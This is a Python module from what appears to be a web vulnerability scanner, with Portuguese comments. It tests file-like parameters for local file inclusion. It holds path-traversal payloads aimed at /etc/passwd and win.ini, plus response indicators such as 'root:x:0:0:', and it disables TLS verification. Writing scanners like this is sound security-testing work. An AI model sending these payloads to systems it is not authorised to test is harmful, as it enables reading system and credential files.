from typing import List, Any

import requests

from src.core.request_rebuilder import rebuild_attack_request
from src.core.vulnerability import Vulnerability
from src.scanners.IScanModule import IScanModule, RequestNode, InjectionPoint

OASTClient = Any


class LfiModule(IScanModule):
    """Detecta LFI por conteudo sensivel em resposta."""

    FILE_PARAM_HINTS = {
        'file', 'path', 'page', 'template', 'include', 'dir', 'document', 'folder', 'name'
    }

    PAYLOADS = [
        "../../../../etc/passwd",
        "..%2f..%2f..%2f..%2fetc%2fpasswd",
        "../../../../windows/win.ini",
    ]

    INDICATORS = [
        "root:x:0:0:",
        "[boot loader]",
        "[extensions]",
        "daemon:",
    ]

    def run_test(
        self,
        request_node: RequestNode,
        injection_point: InjectionPoint,
        oast_client: OASTClient
    ) -> List[Vulnerability]:
        if injection_point['location'] not in {'QUERY', 'BODY_FORM', 'BODY_JSON'}:
            return []

        name = (injection_point.get('parameter_name') or '').lower()
        if name and name not in self.FILE_PARAM_HINTS:
            return []

        session = requests.Session()
        session.verify = False
        session.timeout = 5

        for payload in self.PAYLOADS:
            try:
                request_to_send = rebuild_attack_request(request_node, injection_point, payload)
                response = session.send(request_to_send, timeout=session.timeout)
                body = response.text or ""
                if any(indicator in body for indicator in self.INDICATORS):
                    return [
                        Vulnerability(
                            name="Local File Inclusion (LFI)",
                            severity="High",
                            description=(
                                "Possivel LFI detectada por conteudo sensivel na resposta. "
                                f"Parametro '{injection_point['parameter_name']}'."
                            ),
                            evidence=f"Payload: {payload} | Match: {next((i for i in self.INDICATORS if i in body), '')}",
                            request_node_id=request_node['id'],
                            injection_point_id=injection_point['id']
                        )
                    ]
            except requests.exceptions.RequestException:
                continue
            except Exception:
                return []

        return []
